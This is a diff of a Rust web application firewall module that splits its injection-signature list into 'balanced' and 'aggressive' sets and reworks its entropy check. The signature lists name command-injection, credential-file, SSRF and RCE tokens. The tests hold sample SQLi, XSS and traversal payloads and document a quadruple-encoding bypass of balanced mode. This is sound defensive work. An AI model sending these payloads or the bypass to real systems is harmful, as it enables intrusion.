@@ -1,21 +1,29 @@
-//! Zion WAF — 6-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
+//! Zion WAF — 5-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
 //!
-//! Architecture: 6-gate pipeline, fail-fast, zero-regex.
+//! Architecture: 5-gate pipeline, fail-fast, zero-regex.
 //!
 //! Gate 1: Body size enforcement (O(1), no inspection)
 //! Gate 2: Content-Type strict validation (zero-alloc case-insensitive)
-//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass)
-//! Gate 4: Payload entropy analysis (detect obfuscated/encoded attacks)
-//! Gate 5: JSON structural validation (simd-json, depth + string limits)
-//! Gate 6: Fixed-length profiling (anomalous payload size = drop)
+//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass).
+//!         Pattern set is selected per-profile: `Balanced` (default,
+//!         high precision) or `Aggressive` (broader recall, higher FP).
+//! Gate 4: Payload entropy analysis (detect obfuscated/encoded payloads).
+//!         For JSON content-types the calculation is restricted to bytes
+//!         inside string literals so structural punctuation does not
+//!         dilute the signal. Threshold and kill-switch are per-profile.
+//! Gate 5: JSON structural validation (simd-json, depth + string limits).
 //!
 //! Properties:
 //! - Zero regex (DFA-immune to ReDoS by construction)
 //! - Zero heap allocation on the fast path (GET/HEAD/DELETE/OPTIONS)
 //! - Single-pass body scan via Aho-Corasick automaton
 //! - All gates are O(N) or O(1) — no backtracking, no exponential blowup
+//!
+//! NOTE: prior versions of this header also described a sixth
+//! "fixed-length profiling" gate; it was never implemented and the
+//! advertisement has been removed to keep docs and code in lock-step.
 
-use crate::config::WafProfile;
+use crate::config::{WafMode, WafProfile};
 use aho_corasick::AhoCorasick;
 use std::sync::OnceLock;
 
@@ -28,248 +36,309 @@ pub enum WafVerdict {
 
 // ═══════════════════════════════════════════════════════════════════
 // GATE 3: Aho-Corasick Injection Scanner
-// Built once at first use. Searches thousands of patterns in O(N).
+// Built once at first use. Searches dozens-to-hundreds of patterns in
+// O(N) over the body in a single pass.
+//
+// Two pattern sets:
+//   * BALANCED — high-precision: tag-anchored XSS, anchored SQLi/CMDi,
+//     specific SSRF endpoints, exact CVE strings (Log4Shell, XXE).
+//     Default profile. Tuned to keep FP rate low for content-bearing
+//     APIs (comments, code paste, docs, base64-in-JSON).
+//   * AGGRESSIVE_EXTRA — adds broad, unanchored substrings
+//     (`alert(`, `eval(`, `$gt`, `os.system(`, …) that catch more
+//     attacks but flag legitimate developer/tooling content. Opt-in
+//     via `mode = "aggressive"` on the WAF profile.
+//
+// Each profile gets its own automaton (built lazily, cached for the
+// process lifetime). Switching costs are zero at request time — we
+// just dispatch to the right `&'static AhoCorasick`.
 // ═══════════════════════════════════════════════════════════════════
 
-static INJECTION_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
+/// Patterns active under both `balanced` and `aggressive` modes. Anchored
+/// or rare enough that false positives in real-world request bodies are
+/// uncommon.
+const BALANCED_PATTERNS: &[&str] = &[
+    // ── SQL Injection (anchored quote/keyword combos, low FP) ──
+    "' or '1'='1",
+    "' or 1=1",
+    "'; drop table",
+    "'; delete from",
+    "union select",
+    "union all select",
+    "1; exec ",
+    "1; execute ",
+    "' and '1'='1",
+    "waitfor delay",
+    "pg_sleep(",
+    "'; shutdown",
+    "information_schema",
+    // ── XSS: Tags (anchored on `<`) ──
+    "<script",
+    "</script",
+    "<iframe",
+    "<object",
+    "<embed",
+    "<svg onload",
+    "<img src",
+    "<body onload",
+    "<input onfocus",
+    "<details ontoggle",
+    "<video onerror",
+    "<audio onerror",
+    "<marquee onstart",
+    "<math xlink",
+    // ── XSS: high-signal event handlers (others moved to aggressive) ──
+    "onerror=",
+    "onload=",
+    "srcdoc=",
+    "javascript:",
+    // ── Command Injection (anchored: `;`, `|`, `$(`, backtick, newline) ──
+    "; cat ",
+    "; ls ",
+    "; rm ",
+    "; wget ",
+    "; curl ",
+    ";cat ",
+    ";ls ",
+    ";rm ",
+    ";wget ",
+    ";curl ",
+    "| cat ",
+    "| ls ",
+    "| rm ",
+    "|cat ",
+    "|ls ",
+    "|rm ",
+    "$(cat ",
+    "$(ls ",
+    "`cat ",
+    "`ls ",
+    "\ncat ",
+    "\nls ",
+    "\nwget ",
+    "\ncurl ",
+    "/etc/passwd",
+    "/etc/shadow",
+    // ── Path Traversal ──
+    "../../",
+    "..\\..\\",
+    "%2e%2e%2f",
+    "%2e%2e/",
+    "....//",
+    // ── SSRF: cloud metadata endpoints (specific) ──
+    "http://169.254.169.254",
+    "https://169.254.169.254",
+    "http://[::ffff:169.254",
+    "http://metadata.google",
+    "https://metadata.google",
+    "http://100.100.100.200",
+    "http://0xA9FEA9FE",
+    "http://2852039166",
+    "http://169.254.169.254.nip.io",
+    "169.254.169.254/metadata",
+    "/metadata/v1",
+    "http://192.0.0.192",
+    "kubernetes.default.svc",
+    "/openstack/latest",
+    // ── Windows Path Traversal ──
+    "c:\\windows\\",
+    "c:\\inetpub\\",
+    "..\\..\\..\\windows",
+    // ── Open Redirect ──
+    "/\\evil",
+    "/%09/",
+    // ── LDAP Injection (parens-anchored) ──
+    ")(cn=*",
+    ")(uid=*",
+    ")(mail=*",
+    ")(objectclass=*",
+    "ldap://",
+    "ldaps://",
+    // ── XML/XXE ──
+    "<!entity",
+    "<!doctype",
+    "system \"file://",
+    "system \"http://",
+    "<xsl:",
+    "xmlns:xlink",
+    "<!attlist",
+    "data:text/html",
+    // ── SSTI ──
+    "#{7*7}",
+    "${7*7}",
+    "{{7*7}}",
+    "<%=",
+    "{%import",
+    "#{t(java",
+    // ── CRLF / Header Injection ──
+    "%0d%0a",
+    "%0aset-cookie:",
+    "%0alocation:",
+    "\r\nset-cookie:",
+    // ── Log4Shell / JNDI (specific CVE patterns) ──
+    "${jndi:",
+    "${env:",
+    "${sys:",
+    // ── Prototype pollution / template (specific) ──
+    "__proto__",
+    "constructor.prototype",
+    // ── PHP-specific (specific URI schemes) ──
+    "unserialize(",
+    "php://input",
+    "php://filter",
+    "phar://",
+    // ── GraphQL introspection (specific tokens) ──
+    "{__schema",
+    "{__type",
+    "query{__",
+];
 
-fn get_scanner() -> &'static AhoCorasick {
-    INJECTION_SCANNER.get_or_init(|| {
-        // Patterns: SQL injection, XSS, command injection, path traversal, SSRF.
-        // Case-insensitive matching. All scanned in a SINGLE pass over the body.
-        let patterns = &[
-            // ── SQL Injection ──
-            "' or '1'='1",
-            "' or 1=1",
-            "'; drop table",
-            "'; delete from",
-            "union select",
-            "union all select",
-            "1; exec ",
-            "1; execute ",
-            "' and '1'='1",
-            "sleep(",
-            "benchmark(",
-            "waitfor delay",
-            "pg_sleep(",
-            "'; shutdown",
-            "into outfile",
-            "into dumpfile",
-            "load_file(",
-            "information_schema",
-            "@@version",
-            "char(0x",
-            // ── XSS: Tags ──
-            "<script",
-            "</script",
-            "<iframe",
-            "<object",
-            "<embed",
-            "<svg onload",
-            "<img src",
-            "<body onload",
-            "<input onfocus",
-            "<details ontoggle",
-            "<video onerror",
-            "<audio onerror",
-            "<marquee onstart",
-            "<math xlink",
-            // ── XSS: Event Handlers (high-value subset, =suffix prevents false positive) ──
-            "onerror=",
-            "onload=",
-            "onfocus=",
-            "onmouseover=",
-            "onclick=",
-            "oninput=",
-            "onchange=",
-            "onsubmit=",
-            "onkeydown=",
-            "onkeyup=",
-            "onkeypress=",
-            "ondblclick=",
-            "oncontextmenu=",
-            "ondragstart=",
-            "ondrop=",
-            "onpaste=",
-            "ontouchstart=",
-            "onpointerover=",
-            "onanimationend=",
-            "ontransitionend=",
-            "onresize=",
-            "onscroll=",
-            "onwheel=",
-            "onmouseenter=",
-            "ontoggle=",
-            "onpageshow=",
-            // ── XSS: JS sinks ──
-            "javascript:",
-            "expression(",
-            "alert(",
-            "confirm(",
-            "prompt(",
-            "document.cookie",
-            "document.write",
-            "document.domain",
-            "window.location",
-            "eval(",
-            "fromcharcode",
-            "innerhtml",
-            "outerhtml",
-            "insertadjacenthtml",
-            "srcdoc=",
-            // ── Command Injection ──
-            "; cat ",
-            "; ls ",
-            "; rm ",
-            "; wget ",
-            "; curl ",
-            ";cat ",
-            ";ls ",
-            ";rm ",
-            ";wget ",
-            ";curl ",
-            "| cat ",
-            "| ls ",
-            "| rm ",
-            "|cat ",
-            "|ls ",
-            "|rm ",
-            "$(cat ",
-            "$(ls ",
-            "`cat ",
-            "`ls ",
-            "\ncat ", // newline injection
-            "\nls ",
-            "\nwget ",
-            "\ncurl ",
-            "/etc/passwd",
-            "/etc/shadow",
-            "cmd.exe",
-            "powershell",
-            // ── Path Traversal ──
-            "../../", // 2 levels (sufficient for most attacks)
-            "..\\..\\",
-            "%2e%2e%2f",
-            "%2e%2e/",
-            "....//",
-            // ── SSRF ──
-            "http://169.254.169.254",        // AWS metadata (HTTP)
-            "https://169.254.169.254",       // AWS metadata (HTTPS)
-            "http://[::ffff:169.254",        // IPv6-mapped
-            "http://metadata.google",        // GCP metadata (HTTP)
-            "https://metadata.google",       // GCP metadata (HTTPS)
-            "http://100.100.100.200",        // Alibaba metadata
-            "http://0xA9FEA9FE",             // AWS hex IP
-            "http://2852039166",             // AWS decimal IP
-            "http://169.254.169.254.nip.io", // DNS rebinding
-            // ── SSRF: Cloud Metadata (additional providers) ──
-            "169.254.169.254/metadata", // Azure IMDS
-            "/metadata/v1",             // DigitalOcean metadata API
-            "http://192.0.0.192",       // Oracle Cloud IMDS
-            "kubernetes.default.svc",   // Kubernetes service account
-            "/openstack/latest",        // OpenStack metadata
-            // ── Windows Path Traversal ──
-            "c:\\windows\\",
-            "c:\\inetpub\\",
-            "..\\..\\..\\windows",
-            // ── Open Redirect ──
-            "/\\evil", // backslash normalization redirect
-            "/%09/",   // tab-based redirect bypass
-            // ── LDAP Injection ──
-            ")(cn=*",
-            ")(uid=*",
-            ")(mail=*",
-            ")(objectclass=*",
-            "ldap://",
-            "ldaps://",
-            // ── XML/XXE ──
-            "<!entity",
-            "<!doctype",
-            "system \"file://",
-            "system \"http://",
-            "<xsl:",
-            "xmlns:xlink",
-            "<!attlist",
-            "data:text/html",
-            // ── SSTI (Server-Side Template Injection) ──
-            "#{7*7}",
-            "${7*7}",
-            "{{7*7}}",
-            "<%=",
-            "{%import",
-            "#{t(java",
-            // ── CRLF / Header Injection ──
-            "%0d%0a",
-            "%0aset-cookie:",
-            "%0alocation:",
-            "\r\nset-cookie:",
-            // ── Log4Shell / JNDI ──
-            "${jndi:",
-            "${env:",
-            "${sys:",
-            // ── Template Injection ──
-            "{{constructor",
-            "{{.constructor",
-            "__proto__",
-            "constructor.prototype",
-            // ── NoSQL Injection (MongoDB/Redis/Elastic) ──
-            "$gt", // MongoDB operator injection
-            "$ne",
-            "$regex",
-            "$where",
-            "$lookup",
-            "$unionwith",
-            "db.collection", // MongoDB shell
-            ".find({",
-            ".findone({",
-            ".aggregate([",
-            ".mapreduce(",
-            "this.constructor",
-            // ── Deserialization / RCE ──
-            "runtime.getruntime", // Java RCE
-            "processbuilder",
-            "objectinputstream",
-            "java.lang.runtime",
-            "javax.script.scriptengine",
-            "pickle.loads", // Python deserialization
-            "__reduce__",
-            "__import__(",
-            "subprocess.call",
-            "subprocess.popen",
-            "os.system(",
-            "os.popen(",
-            "unserialize(", // PHP deserialization
-            "php://input",
-            "php://filter",
-            "phar://",
-            // ── GraphQL Injection ──
-            "__schema", // Introspection probe
-            "__type",
-            "mutation{", // Mutation without space (automated tools)
-            "query{__",
-            "{__schema",
-            "{__type",
-        ];
+/// Patterns added on top of BALANCED when `mode = "aggressive"`. These
+/// catch more attacks but DO flag legitimate developer/code/educational
+/// content. Use only on routes where the FP rate is tolerable (admin
+/// panels, internal tooling), never on user-content APIs without measuring.
+const AGGRESSIVE_EXTRA_PATTERNS: &[&str] = &[
+    // ── SQLi: function calls / token reads (FP in BI tools, dump status) ──
+    "sleep(",
+    "benchmark(",
+    "into outfile",
+    "into dumpfile",
+    "load_file(",
+    "@@version",
+    "char(0x",
+    // ── XSS: low-anchor event handlers (FP on any code-bearing payload) ──
+    "onfocus=",
+    "onmouseover=",
+    "onclick=",
+    "oninput=",
+    "onchange=",
+    "onsubmit=",
+    "onkeydown=",
+    "onkeyup=",
+    "onkeypress=",
+    "ondblclick=",
+    "oncontextmenu=",
+    "ondragstart=",
+    "ondrop=",
+    "onpaste=",
+    "ontouchstart=",
+    "onpointerover=",
+    "onanimationend=",
+    "ontransitionend=",
+    "onresize=",
+    "onscroll=",
+    "onwheel=",
+    "onmouseenter=",
+    "ontoggle=",
+    "onpageshow=",
+    // ── XSS: JS API sinks (heavy FP in MDN-style docs / code paste) ──
+    "expression(",
+    "alert(",
+    "confirm(",
+    "prompt(",
+    "document.cookie",
+    "document.write",
+    "document.domain",
+    "window.location",
+    "eval(",
+    "fromcharcode",
+    "innerhtml",
+    "outerhtml",
+    "insertadjacenthtml",
+    // ── Command injection: Windows tokens (FP in event-log shipping) ──
+    "cmd.exe",
+    "powershell",
+    // ── NoSQL ops (no delimiter — `{"id":"$gt-23"}` falsely matches) ──
+    "$gt",
+    "$ne",
+    "$regex",
+    "$where",
+    "$lookup",
+    "$unionwith",
+    "db.collection",
+    ".find({",
+    ".findone({",
+    ".aggregate([",
+    ".mapreduce(",
+    "this.constructor",
+    "{{constructor",
+    "{{.constructor",
+    // ── Deserialization / RCE: language-class-name patterns ──
+    // (FP whenever an APM/error reporter forwards a stack trace)
+    "runtime.getruntime",
+    "processbuilder",
+    "objectinputstream",
+    "java.lang.runtime",
+    "javax.script.scriptengine",
+    "pickle.loads",
+    "__reduce__",
+    "__import__(",
+    "subprocess.call",
+    "subprocess.popen",
+    "os.system(",
+    "os.popen(",
+    // ── GraphQL: lone introspection tokens (also appear in legit schemas) ──
+    "__schema",
+    "__type",
+    "mutation{",
+];
 
-        AhoCorasick::builder()
-            .ascii_case_insensitive(true)
-            .build(patterns)
-            .expect("Failed to build Aho-Corasick automaton")
+static BALANCED_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
+static AGGRESSIVE_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
+
+#[inline]
+fn build_scanner(patterns: &[&str]) -> AhoCorasick {
+    AhoCorasick::builder()
+        .ascii_case_insensitive(true)
+        .build(patterns)
+        .expect("Failed to build Aho-Corasick automaton")
+}
+
+fn balanced_scanner() -> &'static AhoCorasick {
+    BALANCED_SCANNER.get_or_init(|| build_scanner(BALANCED_PATTERNS))
+}
+
+fn aggressive_scanner() -> &'static AhoCorasick {
+    AGGRESSIVE_SCANNER.get_or_init(|| {
+        let mut all: Vec<&str> = Vec::with_capacity(
+            BALANCED_PATTERNS.len() + AGGRESSIVE_EXTRA_PATTERNS.len(),
+        );
+        all.extend_from_slice(BALANCED_PATTERNS);
+        all.extend_from_slice(AGGRESSIVE_EXTRA_PATTERNS);
+        build_scanner(&all)
     })
+}
+
+#[inline]
+fn scanner_for(mode: WafMode) -> &'static AhoCorasick {
+    match mode {
+        WafMode::Balanced => balanced_scanner(),
+        WafMode::Aggressive => aggressive_scanner(),
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════
 // GATE 4: Entropy Analysis
-// High entropy in string values = likely encoded/obfuscated payload.
-// Shannon entropy of random/base64 data is ~5.5-6.0 bits.
-// Normal JSON text is ~3.5-4.5 bits.
-// Note: entropy is a heuristic, not a primary defense. Calculated on
-// the full body including JSON keys, which lowers entropy. An attacker
-// can dilute a high-entropy payload with padding text. This gate is
-// supplementary to the Aho-Corasick scanner.
+// Shannon entropy is a heuristic for "this body looks like obfuscated /
+// encrypted / packed content rather than human text or normal JSON."
+//
+// Reference points (bits/byte):
+//   * English / source code:       ~3.5–4.7
+//   * JSON struct (with keys):     ~3.5–5.5
+//   * Pure base64 (max theoretic): 6.0
+//   * JWT / signed URL:            5.5–6.0
+//   * Random / encrypted blob:     7.5–8.0
+//
+// The previous default (5.5) flagged any base64 / JWT in a request body —
+// a foot-gun for APIs that legitimately accept signed payloads. The new
+// default is 6.5, with a per-profile override (`entropy_threshold`) and
+// a kill-switch (`entropy_check`).
+//
+// For JSON bodies we additionally restrict the calculation to the bytes
+// inside string literals (keys + values, excluding structural punctuation
+// and numeric literals), so low-entropy structural bytes don't dilute the
+// signal.
 // ═══════════════════════════════════════════════════════════════════
-
-const MAX_ENTROPY_THRESHOLD: f64 = 5.5; // bits per byte
 
 /// Unified WAF Normalizer (Single-Pass, Zero-Alloc)
 /// Replaces recursive Cow allocations with a fast byte-by-byte state machine.
@@ -358,9 +427,8 @@ fn hex_val(b: u8) -> Option<u8> {
     }
 }
 
-/// Calculate Shannon entropy of a byte slice.
-/// Returns bits per byte (0.0 = constant, 8.0 = perfectly random).
-/// Caller guarantees data.len() >= 256.
+/// Calculate Shannon entropy of a byte slice (bits per byte).
+/// 0.0 = constant; 8.0 = perfectly random. Caller guarantees data.len() ≥ 1.
 #[inline]
 fn shannon_entropy(data: &[u8]) -> f64 {
     let mut freq = [0u32; 256];
@@ -377,6 +445,67 @@ fn shannon_entropy(data: &[u8]) -> f64 {
         }
     }
     entropy
+}
+
+/// Shannon entropy computed only over bytes inside JSON string literals.
+///
+/// Walks the JSON byte-by-byte (no allocation, no parse), accumulating
+/// frequencies for every byte seen between matching `"` delimiters. Skips
+/// structural bytes (`{`, `[`, `,`, `:`, whitespace) and numeric/literal
+/// tokens, all of which are low-entropy and would otherwise dilute the
+/// signal of an obfuscated payload hidden inside a single string value.
+///
+/// `\` escape sequences are honoured (the next byte is treated as inside
+/// the string and not as a closing `"`). `\uXXXX` is consumed as 5 escape
+/// bytes after the `\` — we don't decode it; this is a heuristic, not a
+/// validator.
+///
+/// Returns `None` when fewer than `min_sample` total string bytes were
+/// observed — too small a sample to draw a meaningful conclusion (and the
+/// caller already enforces a 256-byte body floor before invoking the
+/// entropy gate, so this only triggers on JSON that is mostly structure).
+fn shannon_entropy_json_strings(body: &[u8], min_sample: usize) -> Option<f64> {
+    let mut freq = [0u32; 256];
+    let mut total: usize = 0;
+    let mut in_string = false;
+    let mut escaped = false;
+
+    for &b in body {
+        if escaped {
+            escaped = false;
+            if in_string {
+                freq[b as usize] += 1;
+                total += 1;
+            }
+            continue;
+        }
+        if in_string {
+            if b == b'\\' {
+                escaped = true;
+            } else if b == b'"' {
+                in_string = false;
+            } else {
+                freq[b as usize] += 1;
+                total += 1;
+            }
+        } else if b == b'"' {
+            in_string = true;
+        }
+        // bytes outside strings (structure, numbers, whitespace) are skipped
+    }
+
+    if total < min_sample {
+        return None;
+    }
+    let inv = 1.0 / total as f64;
+    let mut entropy = 0.0f64;
+    for &c in &freq {
+        if c > 0 {
+            let p = c as f64 * inv;
+            entropy -= p * p.log2();
+        }
+    }
+    Some(entropy)
 }
 
 // ═══════════════════════════════════════════════════════════════════
@@ -478,7 +607,7 @@ fn check_depth_and_strings_raw(body: &[u8], max_depth: usize, max_string_len: us
 // MAIN PIPELINE
 // ═══════════════════════════════════════════════════════════════════
 
-/// Validate an incoming request through the 6-gate WAF pipeline.
+/// Validate an incoming request through the 5-gate WAF pipeline.
 /// Each gate is fail-fast: first deny wins, no further inspection.
 #[inline]
 pub fn validate_request(
@@ -538,14 +667,11 @@ pub fn validate_request(
     };
 
     // ── Gate 3: Aho-Corasick injection scan (O(N), single pass) ──
-
-    // Always run raw Aho-Corasick scan — patterns like "union select" and
-    // "powershell" contain only letters/spaces and can't be pre-filtered.
-    // The SIMD fast-reject is applied to the NORMALIZATION path only
-    // (which is the expensive part: URL-decode, SQL comment strip, etc.)
+    // Profile-driven scanner: balanced (default) or aggressive.
+    let scanner = scanner_for(profile.mode);
 
     // Scan raw body first (fast path — no alloc if no encoding present).
-    if get_scanner().is_match(body) {
+    if scanner.is_match(body) {
         return WafVerdict::Deny("injection pattern detected");
     }
 
@@ -571,7 +697,7 @@ pub fn validate_request(
                 // 2 iterations catches double/triple encoding (real-world max).
                 // Convergence check breaks early if no further decoding is needed.
                 for _ in 0..2 {
-                    if get_scanner().is_match(out.as_slice()) {
+                    if scanner.is_match(out.as_slice()) {
                         return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                     }
 
@@ -596,7 +722,7 @@ pub fn validate_request(
                 }
 
                 // Final check after convergence
-                if get_scanner().is_match(out.as_slice()) {
+                if scanner.is_match(out.as_slice()) {
                     return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                 }
 
@@ -618,13 +744,24 @@ pub fn validate_request(
     }
 
     // ── Gate 4: Entropy analysis (detect obfuscated payloads) ──
-    // Only scan bodies >= 256 bytes — shorter payloads lack sufficient
-    // data for meaningful entropy analysis, and encoded attacks need
-    // space for their payload. Saves ~1μs per small POST.
-    if body.len() >= 256 {
-        let entropy = shannon_entropy(body);
-        if entropy > MAX_ENTROPY_THRESHOLD {
-            return WafVerdict::Deny("suspicious payload entropy");
+    // Only scan bodies ≥ 256 bytes (smaller payloads lack a meaningful
+    // sample). For JSON content-types, restrict the calculation to bytes
+    // inside string literals so structural punctuation and numeric
+    // tokens don't dilute the signal. Threshold and kill-switch are
+    // per-profile (`entropy_threshold`, `entropy_check`).
+    if profile.entropy_check && body.len() >= 256 {
+        let entropy = if is_json {
+            // Need ≥128 string-content bytes to draw a conclusion. If the
+            // JSON is mostly structure (nested arrays of numbers, etc.),
+            // skip the gate rather than report a misleading reading.
+            shannon_entropy_json_strings(body, 128)
+        } else {
+            Some(shannon_entropy(body))
+        };
+        if let Some(e) = entropy {
+            if e > profile.entropy_threshold {
+                return WafVerdict::Deny("suspicious payload entropy");
+            }
         }
     }
 
@@ -639,10 +776,16 @@ pub fn validate_request(
 /// Validate a request URI (path + query string) through the injection scanner.
 /// Called for ALL methods to catch SQLi/XSS in query parameters.
 /// Zero cost if no patterns match (single O(N) pass).
+///
+/// Mode comes from the route's WAF profile so URI scanning matches body
+/// scanning: a route in `balanced` mode won't deny a query string that
+/// only the `aggressive` pattern set would catch.
 #[inline]
-pub fn validate_uri(uri: &str) -> WafVerdict {
+pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
+    let scanner = scanner_for(mode);
+
     // Scan raw URI
-    if get_scanner().is_match(uri.as_bytes()) {
+    if scanner.is_match(uri.as_bytes()) {
         return WafVerdict::Deny("injection pattern in URI");
     }
     // Normalized URI scan: URL-decode + SQL comment strip + JSON unicode
@@ -660,7 +803,7 @@ pub fn validate_uri(uri: &str) -> WafVerdict {
                 normalize_unified(uri_bytes, &mut out);
 
                 for _ in 0..2 {
-                    if get_scanner().is_match(out.as_slice()) {
+                    if scanner.is_match(out.as_slice()) {
                         return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                     }
 
@@ -680,7 +823,7 @@ pub fn validate_uri(uri: &str) -> WafVerdict {
                     std::mem::swap(&mut *out, &mut *sec);
                 }
 
-                if get_scanner().is_match(out.as_slice()) {
+                if scanner.is_match(out.as_slice()) {
                     return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                 }
                 None
@@ -720,8 +863,22 @@ mod tests {
         std::borrow::Cow::Owned(out)
     }
 
+    /// Default-config profile (Balanced mode, entropy gate on at 6.5).
+    /// Historically called `strict` — the name is kept to minimise diff
+    /// noise in existing assertions; semantics now match the runtime
+    /// default a real deployment will see.
     fn strict_profile() -> WafProfile {
         WafProfile::default()
+    }
+
+    /// Aggressive-mode profile: balanced patterns plus broad-substring
+    /// patterns (alert(, eval(, $gt, os.system(, …). Body inspection is
+    /// otherwise unchanged.
+    fn aggressive_profile() -> WafProfile {
+        WafProfile {
+            mode: WafMode::Aggressive,
+            ..WafProfile::default()
+        }
     }
 
     fn relaxed_profile() -> WafProfile {
@@ -735,6 +892,7 @@ mod tests {
                 "multipart/form-data".to_string(),
                 "application/xml".to_string(),
             ],
+            ..WafProfile::default()
         }
     }
 
@@ -955,16 +1113,45 @@ mod tests {
     }
 
     #[test]
-    fn denies_quadruple_url_encoded_xss() {
-        // %25253C → %253C → %3C → < (quadruple encoded)
-        // May match on raw scan (partial decode) or normalized scan
+    fn aggressive_denies_quadruple_url_encoded_xss() {
+        // %25253C → %253C → %3C → < requires 4 normalisation passes; the
+        // decode loop performs at most 3, so the *encoded* `<script` part
+        // is not what catches this body. The raw `alert(` literal does —
+        // and `alert(` lives in the AGGRESSIVE pattern set. This test pins
+        // that aggressive mode picks it up; balanced will not (covered by
+        // `balanced_allows_quadruple_url_encoded_xss` below).
         let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
-        let result = validate_request("POST", Some("application/json"), body, &strict_profile());
+        let result = validate_request("POST", Some("application/json"), body, &aggressive_profile());
         assert!(
             matches!(result, WafVerdict::Deny(_)),
             "expected Deny, got {:?}",
             result
         );
+    }
+
+    #[test]
+    fn balanced_allows_quadruple_url_encoded_xss() {
+        // Same body, balanced mode: `alert(` is no longer a balanced
+        // pattern, and 4-level encoding outruns the 3-pass decode loop —
+        // so `<script` is never exposed. Expected outcome: Allow.
+        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
+        assert_eq!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn balanced_denies_triple_url_encoded_xss_via_script_tag() {
+        // Triple-encoded `<script` decodes within the 3-pass decode loop
+        // and matches the balanced pattern `<script`. Pins the decode-loop
+        // recursion still works when targeting a high-precision pattern.
+        // %25253c → %253c → %3c → <
+        let body = br#"{"html":"%25253cscript src=evil>"}"#;
+        assert!(matches!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Deny(_)
+        ));
     }
 
     // ── URI scanning ──
@@ -973,7 +1160,7 @@ mod tests {
     fn uri_denies_sqli_in_query() {
         // "' or 1=1" is in the pattern list
         assert_eq!(
-            validate_uri("/api/users?id=' or 1=1"),
+            validate_uri("/api/users?id=' or 1=1", WafMode::Balanced),
             WafVerdict::Deny("injection pattern in URI")
         );
     }
@@ -981,7 +1168,7 @@ mod tests {
     #[test]
     fn uri_allows_safe_path() {
         assert_eq!(
-            validate_uri("/api/v1/users?page=2&sort=name"),
+            validate_uri("/api/v1/users?page=2&sort=name", WafMode::Balanced),
             WafVerdict::Allow
         );
     }
@@ -990,7 +1177,7 @@ mod tests {
     fn uri_denies_encoded_traversal() {
         // "../../../" is the pattern — 3 levels of traversal
         assert_eq!(
-            validate_uri("/api/files?path=../../../etc/passwd"),
+            validate_uri("/api/files?path=../../../etc/passwd", WafMode::Balanced),
             WafVerdict::Deny("injection pattern in URI")
         );
     }
@@ -999,7 +1186,7 @@ mod tests {
     fn uri_denies_encoded_traversal_pct() {
         // %2e%2e%2f is literally in the pattern list, so matches on raw scan
         assert_eq!(
-            validate_uri("/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log"),
+            validate_uri("/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log", WafMode::Balanced),
             WafVerdict::Deny("injection pattern in URI")
         );
     }
@@ -1008,7 +1195,10 @@ mod tests {
     fn uri_denies_double_encoded_traversal() {
         // %252e%252e%252f → %2e%2e%2f → ../ (matches after recursive decode)
         assert_eq!(
-            validate_uri("/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log"),
+            validate_uri(
+                "/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log",
+                WafMode::Balanced,
+            ),
             WafVerdict::Deny("injection pattern in URI (encoded)")
         );
     }
@@ -1267,7 +1457,7 @@ mod tests {
     #[test]
     fn uri_denies_plus_encoded_sqli() {
         assert_eq!(
-            validate_uri("/api/search?q='+or+1=1"),
+            validate_uri("/api/search?q='+or+1=1", WafMode::Balanced),
             WafVerdict::Deny("injection pattern in URI (encoded)")
         );
     }
@@ -1311,7 +1501,7 @@ mod tests {
     #[test]
     fn uri_denies_sql_comment_evasion() {
         assert_eq!(
-            validate_uri("/search?q=union/**/select"),
+            validate_uri("/search?q=union/**/select", WafMode::Balanced),
             WafVerdict::Deny("injection pattern in URI (encoded)")
         );
     }
@@ -1350,10 +1540,12 @@ mod tests {
     // ── New categories (v0.1.4) ──
 
     #[test]
-    fn denies_xss_event_handler_oninput() {
+    fn aggressive_denies_xss_event_handler_oninput() {
+        // `oninput=` is aggressive-only (low-anchor handler, FP-prone in
+        // any code-bearing payload). Test pinned under aggressive mode.
         let body = br#"{"html":"<div oninput=alert(1)>"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
@@ -1377,64 +1569,70 @@ mod tests {
     }
 
     #[test]
-    fn denies_xss_innerhtml() {
+    fn aggressive_denies_xss_innerhtml() {
+        // `innerhtml` is aggressive-only (high FP in dev tooling, MDN-style
+        // doc snippets, code-paste APIs).
         let body = br#"{"code":"element.innerHTML = userInput"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_nosql_injection_gt() {
+    fn aggressive_denies_nosql_injection_gt() {
+        // `$gt` (no anchor) is aggressive-only — matches anywhere, including
+        // legit strings like `"$gt-23"`. Aggressive mode pins the catch.
         let body = br#"{"username":{"$gt":""},"password":{"$gt":""}}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_nosql_injection_where() {
+    fn aggressive_denies_nosql_injection_where() {
         let body = br#"{"$where":"this.password == 'admin'"}"#;
         assert_eq!(
